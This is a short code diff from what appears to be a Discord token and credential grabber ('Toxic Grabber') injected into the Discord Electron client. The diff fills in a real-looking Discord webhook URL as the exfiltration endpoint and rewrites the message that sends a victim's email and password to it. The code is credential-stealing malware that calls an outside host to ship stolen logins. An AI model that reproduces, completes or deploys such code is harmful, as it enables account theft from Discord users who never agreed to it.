@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://canary.discord.com/api/webhooks/925805068815593503/MCMpKZviFXKgpIMtu4b8QTfIlgYN3ZDg2XGLNdQbTefIa-8iswrTh0uDeIc5RAkT035L";
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
@@ -152,8 +152,8 @@ function Login(email, password, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Informações da Conta**",
-                            "value": `PC infectado by Toxic Grabber!\n\n ➜ Email:*${email}\n ➜ Senha: ${password}\n➜ IP ${IP}`,
+                            "name": "**Discord Infected by Toxic**",
+                            "value": `☢️ Email: ${email} - Senha: {$password} ☢️`,
                             "inline": true
                         },
                         {
